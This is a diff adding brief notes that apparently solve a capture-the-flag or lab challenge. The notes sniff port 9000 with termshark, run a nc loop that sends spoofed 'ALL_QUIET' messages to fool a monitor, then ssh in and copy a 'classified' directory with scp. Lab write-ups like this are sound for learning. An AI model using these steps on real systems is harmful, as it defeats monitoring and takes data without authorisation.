@@ -1,0 +1,17 @@
+Termshark
+1. ip link show type bridge
+	#find bridge for termshark command
+2. find ip br-xxxxxxxxxx output
+	#resets with each build
+3. sudo termshark -i br-xxxxxx -f "port 9000"
+	#need sudo (ask adam)
+Solution
+1. ssh -p 2222 4rch1v3@localhost
+	#attempt ssh normally get kicked off
+2. sudo termshark -i br-xxxxxxxxx -f "port 9000"
+	#sniff okay packets
+3. while true; do echo "ALL_QUIET" | nc localhost 9000; sleep 0.2; done
+	#spoofs okay messages
+4. ssh in again
+5. scp classified directory
+	#no write permissions
